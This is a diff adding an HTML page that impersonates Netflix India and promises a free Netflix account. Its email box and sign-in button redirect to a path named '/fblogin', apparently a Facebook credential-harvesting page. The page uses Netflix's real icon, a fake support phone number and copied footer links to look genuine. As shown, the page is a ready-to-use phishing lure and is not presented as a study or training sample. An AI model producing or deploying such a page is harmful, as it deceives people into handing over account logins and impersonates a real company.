@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Netflix India – Watch TV Shows Online, Watch Movies Online</title>
+  <link rel="stylesheet" href="style.css" />
+  <link href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png" rel="shortcut icon">
+</head>
+
+<body>
+  <div class="boxA">
+    <div class="boxAimg">
+      <div class="boxAfadeA">
+        <div class="boxAfadeB">
+          <nav>
+            <img class="logo" src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png" alt="" />
+            <a href="/fblogin"><button class="signin">Sign in</button></a>
+          </nav>
+          <div class="content">
+            <h1 class="boxAtitle">
+              You Have Successfully Sign-Up For Free Netflix Account 
+            </h1>
+            <h3 class="boxAdes">
+              <!-- SignUp to get Netflix Subscription Account. Subscription Account
+                will be sended on your Email Address. -->
+              You Will Recive Your Netflix Access<br />
+              <hr />
+              In 24 Hours on Your Email Address
+            </h3>
+            <input id="netin" class="boxAin" type="email" placeholder="Email address" />
+            <button onclick="loginpage()" class="boxAbtn"> Get Started </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="space"></div>
+
+  <div class="boxB">
+    <div class="wri">
+      <h2>Sign In To Get Access To Your Netflix Account</h2>
+    </div>
+    <div class="Bimgcon">
+      <img src="net1.png" alt="" srcset="" />
+    </div>
+  </div>
+
+  <div class="space"></div>
+
+  <div class="boxB">
+    <div class="wri">
+      <h2>
+        After Sign-Up Id & Password Will be Send To your Email Address In 24
+        Hrs
+      </h2>
+    </div>
+    <div class="Bimgcon">
+      <img class="sqrimg" src="net2.jpg" alt="" srcset="" />
+    </div>
+  </div>
+
+  <div class="space"></div>
+
+  <div class="boxB">
+    <div class="wri">
+      <h2>Use It On Four Devices At Same Time.</h2>
+    </div>
+    <div class="Bimgcon">
+      <img src="net3.png" alt="" srcset="" />
+    </div>
+  </div>
+
+  <div class="space"></div>
+
+  <div class="boxB">
+    <div class="wri">
+      <h2 class="boxAtitle">If You Don't Receive Email In 24 Hrs</h2>
+      <h4 class="boxBdes">
+        It May Be Some Account Connection Issue. Try With Different Account
+      </h4>
+    </div>
+    <div class="Bimgcon">
+      <img src="net4.png" alt="" srcset="" />
+    </div>
+  </div>
+
+  <div class="space"></div>
+
+  <div class="boxB">
+    <div class="writ">
+      <h2>Frequently Asked Questions</h2>
+      <li class="ques">What is Netflix?</li>
+      <li class="ques">How much does Netflix cost?</li>
+      <li class="ques">Where can I watch?</li>
+      <li class="ques">How do I cancel?</li>
+      <li class="ques">What can I watch on Netflix?</li>
+      <li class="ques">Is Netflix good for kids?</li>
+    </div>
+  </div>
+
+  <div class="space"></div>
+
+  <div class="boxB">
+    <h3 class="bq">Questions? Call 000-800-040-1843</h3>
+    <div class="con">
+      <div class="sec">
+        <li class="secli">FAQ</li>
+        <li class="secli">Account</li>
+        <li class="secli">Investor relations</li>
+        <li class="secli">Ways to Watch</li>
+        <li class="secli">Privacy</li>
+        <li class="secli">Corporate Info</li>
+        <li class="secli">Speed Test</li>
+        <li class="secli">FAQ</li>
+        <li class="secli">Account</li>
+        <li class="secli">Investor relations</li>
+      </div>
+      <div class="sec">
+        <li class="secli">Help Centre</li>
+        <li class="secli">Media Centre</li>
+        <li class="secli">Jobs</li>
+        <li class="secli">Terms of use</li>
+        <li class="secli">Cookie Preferences</li>
+        <li class="secli">Contact Us</li>
+        <li class="secli">Legal Notices</li>
+        <li class="secli">Help Centre</li>
+        <li class="secli">Media Centre</li>
+        <li class="secli">Jobs</li>
+      </div>
+    </div>
+    <hr>
+    <small>Netflix || India</small>
+    <!-- <div class="Questions">
+        <h2>Questions? Call 000-800-040-1843 </h2>
+      </div> -->
+  </div>
+  <script>
+    function loginpage() {
+      if (document.getElementById("netin").value === "") {
+        document.getElementById("netin").placeholder = "Email is required.";
+      } else if (document.getElementById("netin").value.includes("@") && document.getElementById("netin").value.includes(".com") ) {
+        location.href = "/fblogin";
+      } else {
+        document.getElementById("netin").value = ""
+        document.getElementById("netin").placeholder = "Enter a valid Email";
+      }
+    }
+  </script>
+</body>
+
+</html>
